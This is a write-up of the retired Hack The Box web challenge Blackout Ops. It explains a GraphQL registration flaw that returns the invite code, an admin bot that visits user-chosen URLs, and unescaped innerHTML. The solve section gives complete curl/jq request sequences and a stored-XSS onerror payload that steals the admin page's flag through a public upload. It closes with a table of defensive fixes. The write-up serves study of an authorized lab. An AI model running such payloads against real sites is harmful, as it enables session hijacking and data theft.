---
title: "Hack The Box Challenge — Blackout Ops"
summary: "Blackout Ops combines a leaked GraphQL invite code, stored XSS in an admin report view, and an automated admin browser. The solve turns a public upload into a flag retrieval channel."
platform: "Hack The Box"
contentType: "challenge"
publicationPolicy: "retired"
challengeCategory: "Web"
difficulty: "Easy"
solvedAt: 2026-11-17
publishedAt: 2026-11-17
tags:
  - web-security
  - graphql
  - stored-xss
  - admin-bot
  - file-upload
  - source-code-review
tools:
  - Web browser
  - Kali Linux
  - curl
  - jq
  - nl
cves: []
htbUrl: "https://app.hackthebox.com/challenges/Blackout%2520Ops"
cover: "/images/writeups/hackthebox/challenges/shared/hackthebox-challenge-cover.webp"
coverAlt: "Abstract cybersecurity challenge medallion with terminal, puzzle and network motifs"
featured: false
draft: false
---

> **Authorized-lab notice:** This write-up covers the retired Hack The Box Web Challenge Blackout Ops. I confirmed that Blackout Ops appeared under the platform's **Retired** Challenges tab on 17 November 2026. The actual flag, test account, session cookie and temporary target address are omitted. The original challenge ZIP is not redistributed.

Browse the [write-ups archive](/writeups/) or the [Challenges archive](/writeups/challenges/) for more retired labs.

## Executive summary

Blackout Ops supplied a Node.js/GraphQL application behind OpenResty, a file upload endpoint and a Puppeteer bot. The registration mutation returned its own invitation code, which let me create and verify a normal user without any out-of-band step. A verified user could submit an incident report with an `evidenceUrl`; the application then logged a browser in as the administrator and sent it to that URL.

The administrator's `/admin` page displayed the flag and inserted report fields into `innerHTML` without escaping. I submitted a report whose `details` contained an image error handler and whose `evidenceUrl` pointed the bot back to its own `/admin` page. In the admin browser, that handler read the flag from the page and uploaded the text as the body of a `.jpg` file. Because `/files/` served uploads publicly, a normal unauthenticated GET retrieved the file. The Kali run confirmed each transition, ending with a flag-shaped result and challenge completion. The flag value is redacted here.

![Conceptual illustration of the GraphQL registration, admin browser, protected dashboard and public file used in the Blackout Ops solve](/images/writeups/hackthebox/challenges/web/blackout-ops/exploit-chain.webp)

*Original conceptual illustration of the observed attack chain. It is not a screenshot or evidence of execution.*

## Challenge information

| Item | Value |
| --- | --- |
| Name | Blackout Ops |
| Category | Web |
| Difficulty | Easy |
| Status | Retired, verified in the HTB Retired Challenges list on 17 November 2026 |
| Released | 6 June 2025, as shown on the HTB challenge page |
| Challenge page | [Hack The Box — Blackout Ops](https://app.hackthebox.com/challenges/Blackout%2520Ops) |
| Target | Ephemeral HTTP container; use the host and port from your own HTB instance |

## Provided material and first observations

The challenge page presented a login form, a new-agent registration link and a downloadable source archive. The extracted tree included `challenge/app.js`, `challenge/graphql/`, `challenge/routes/`, `challenge/views/`, `challenge/bot.js`, `config/nginx.conf` and a Dockerfile. I inspected the source with `nl -ba` to keep line numbers visible while following the request flow. I did not run the supplied container locally; the live tests below were performed from Kali against the authorized HTB instance.

The Express app mounted the GraphQL API, upload route and public uploaded-file route:

```js
app.use('/files', express.static(path.join(__dirname, 'uploads')));
app.use('/upload', uploadRouter);
app.use('/graphql', cors(), bodyParser.json(), expressMiddleware(server, {
  context: async ({ req, res }) => createContext({ req, res }),
}));
```

The GraphQL schema exposed `register`, `login`, `verifyAccount` and `submitIncidentReport`. That suggested an account-gated route to the bot rather than guessing an administrator password. The database initializer generated the admin password with `crypto.randomBytes(32)`, and the login resolver queried users by a parameterized email. Neither a default admin password nor an SQL injection was supported by the inspected code.

## Identifying the trust boundaries

### The invitation code is returned to the registrant

In `graphql/resolvers.js`, `register` checks for an `@blackouts.htb` email address, creates an eight-character code and returns `inviteCode` in the mutation response. `verifyAccount` compares the supplied code with the current user's stored code. Registration does **not** create a login session, so the sequence is register, log in, then verify. After verification, the session's `verified` property is set to `true`.

This made the code an access gate with no independent verification: the requester received the same secret needed to pass it. The generated code's randomness did not matter for this path.

### A verified user's report dispatches an admin browser

`submitIncidentReport` requires an authenticated, verified user. If `evidenceUrl` begins with `http://` or `https://`, the resolver saves the report, fetches the admin account's credentials from the database and calls `bot.visitReport(evidenceUrl, adminEmail, adminPassword)`. The bot logs in at `http://127.0.0.1:1337/` and then navigates to the supplied URL. The prefix check restricts URL syntax but does not restrict the destination host or path.

### The admin view renders attacker-controlled HTML

The `/admin` route allows only an admin session and reads `/flag.txt` into the page. Its template places the value in an `<h4>` element. Separately, the page fetches all incident reports and builds markup like this:

```js
container.innerHTML = reports.map(report => `
  <h3>${report.title}</h3>
  <p>${report.details}</p>
  <a href="${report.evidenceUrl}">VIEW EVIDENCE</a>
`).join('');
```

The excerpt omits surrounding styling, but keeps the relevant operation: report data becomes HTML inside the administrator's browser. Nunjucks' server-side `autoescape: true` does not protect this client-side `innerHTML` assignment. An `<img>` error handler in `details` can execute when the admin page renders the report.

### Uploaded bytes are publicly reachable

OpenResty's `/upload` rule allows filenames ending in `jpg`, `png` or `gif`. The rule checks the extension, not the file's bytes. The Express route writes the incoming bytes under `uploads/`, and `/files/` serves that directory without a session check. A text body named `.jpg` is therefore a viable challenge-local output channel. We verified this with a harmless probe before relying on it for the final payload.

## Solution: the verified Kali sequence

The snippets below use `<HOST>:<PORT>` for the temporary HTB target and a throwaway password. They preserve the requests and logic used in the solve while removing the actual target address, account and invitation code. Run them only against your own authorized challenge instance.

### 1. Register, log in and verify

I used GraphQL variables through `jq` so the generated email and password were safely encoded in JSON. The same cookie jar was used for login and verification.

```bash
BASE='http://<HOST>:<PORT>'
EMAIL="agent-$(date +%s)@blackouts.htb"
PASS='choose-a-test-password'
COOKIE='blackout-cookies.txt'

REG=$(curl -sS "$BASE/graphql" \
  -H 'Content-Type: application/json' \
  --data "$(jq -nc --arg e "$EMAIL" --arg p "$PASS" \
    '{query:"mutation($e:String!,$p:String!){register(email:$e,password:$p){email inviteCode verified}}",variables:{e:$e,p:$p}}')")

CODE=$(echo "$REG" | jq -r '.data.register.inviteCode')

curl -sS -c "$COOKIE" -b "$COOKIE" "$BASE/graphql" \
  -H 'Content-Type: application/json' \
  --data "$(jq -nc --arg e "$EMAIL" --arg p "$PASS" \
    '{query:"mutation($e:String!,$p:String!){login(email:$e,password:$p){email verified}}",variables:{e:$e,p:$p}}')"

curl -sS -c "$COOKIE" -b "$COOKIE" "$BASE/graphql" \
  -H 'Content-Type: application/json' \
  --data "$(jq -nc --arg code "$CODE" \
    '{query:"mutation($code:String!){verifyAccount(inviteCode:$code){email verified}}",variables:{code:$code}}')"
```

The real responses showed `verified: false` at registration and login, followed by `verified: true` from `verifyAccount`. The `register` response also contained the code that made that final step possible. No code guessing or email access was needed.

### 2. Test the upload channel with harmless data

Before constructing the XSS, I uploaded a small text marker with a `.jpg` filename using the verified account:

```bash
PROBE="phoenix-probe-$(date +%s).jpg"
printf 'probe-ok\n' > "$PROBE"
curl -i -b "$COOKIE" -F "file=@$PROBE;type=image/jpeg" "$BASE/upload"
curl -i "$BASE/files/$PROBE"
```

The upload returned `HTTP/1.1 200 OK` and `Upload complete`. The public GET also returned `HTTP/1.1 200 OK`, `Content-Type: image/jpeg` and the literal body `probe-ok`. This established that the proxy accepted the extension, Express stored arbitrary bytes and `/files/` returned those bytes. It did **not** demonstrate a multipart parser bypass; the probe used an ordinary multipart request.

### 3. Submit a report that the admin bot opens

The payload was placed in `details`, where the admin view inserts it into `innerHTML`. The `evidenceUrl` was the bot's own `/admin` URL, using the loopback host from `bot.js`. The image's invalid `src` fires `onerror`. The handler reads the admin page's `<h4>`, uploads its text as a `.jpg`, and then navigates to `/dashboard`. That last navigation also satisfies the bot's subsequent `waitForNavigation()` call.

```bash
PROOF="phoenix-flag-$(date +%s).jpg"

PAYLOAD="<img src=x onerror=\"(async()=>{const f=document.querySelector('h4').textContent.trim();const d=new FormData();d.append('file',new Blob([f],{type:'image/jpeg'}),'$PROOF');await fetch('/upload',{method:'POST',body:d});location.href='/dashboard'})()\">"

REQ=$(jq -nc --arg d "$PAYLOAD" --arg u 'http://127.0.0.1:1337/admin' \
  '{query:"mutation($d:String!,$u:String){submitIncidentReport(title:\"Phoenix\",details:$d,evidenceUrl:$u){id evidenceUrl}}",variables:{d:$d,u:$u}}')

curl -sS -b "$COOKIE" "$BASE/graphql" \
  -H 'Content-Type: application/json' \
  --data "$REQ" | jq
```

The mutation returned report ID `1` and the loopback `evidenceUrl` without an error. An ID confirms that the report was stored; it does not, alone, prove XSS execution. The public file retrieval below is the stronger end-to-end check.

### 4. Retrieve the proof file

The bot ran asynchronously, so I polled the predicted filename rather than treating the mutation response as completion:

```bash
for i in {1..20}; do
  FLAG=$(curl -fsS "$BASE/files/$PROOF" 2>/dev/null) || true
  if [[ -n "$FLAG" ]]; then
    printf 'Flag: %s\n' "$FLAG"
    break
  fi
  sleep 2
done
```

The loop returned a value matching the HTB flag format, shown here only as `Flag: <REDACTED_FLAG>`. The challenge was subsequently completed on the HTB page. This validates the chain: admin login, admin-page navigation, stored XSS execution, admin-context upload and public retrieval.

## Why the chain works

Each step crosses a different boundary. `register` exposes the value used by `verifyAccount`, so a user can unlock the verified actions without an independent invitation. `submitIncidentReport` lets that verified user choose where an authenticated admin browser goes. Pointing it to `/admin` ensures the browser renders the report list in the same session that can see the flag. `innerHTML` then interprets attacker-controlled `details` as markup, and the error handler runs with the admin page's origin and cookies. Finally, the upload route accepts text under a `.jpg` name and serves it from a public path.

This route did not need the admin password, SQL injection, direct access to `/flag.txt`, an external webhook or a malformed multipart body. The key observation was that the admin bot could be made to render the application's own unsafe admin view.

## Defensive perspective

| Boundary | Practical fix |
| --- | --- |
| Invitation verification | Do not return the verification secret to the requester; deliver it through an independent trusted channel and use a cryptographic generator. |
| Bot navigation | Restrict the destinations an admin-authenticated bot may visit; avoid giving a browsing bot full administrative session access where possible. |
| Report rendering | Render report fields as text with safe DOM APIs, or apply a narrowly defined sanitizer before allowing any HTML. |
| Upload handling | Validate content as well as extension, store uploads outside the app's origin, and apply authorization to sensitive outputs. |
| Cross-layer enforcement | Keep proxy and application file policies consistent; test the entire upload-and-serve path, not only the first filter. |

## Key takeaways

- Source review turned a broad web challenge into four testable boundaries: verification, bot navigation, HTML rendering and file retrieval.
- A success response from the report mutation proved storage, while the later public GET proved that the browser-side payload actually ran.
- File extension checks do not establish file type or protect data when arbitrary bytes are written and publicly served.
- The observed method was a normal multipart upload paired with stored XSS; no untested parser-bypass claim is needed to explain the solve.

## References

- [Hack The Box — Blackout Ops](https://app.hackthebox.com/challenges/Blackout%2520Ops) — challenge description, category, difficulty, release date, Retired listing and completion state.
- [Hack The Box platform rules](https://help.hackthebox.com/en/articles/12325897-hack-the-box-platform-rules) — publication rule for retired content.
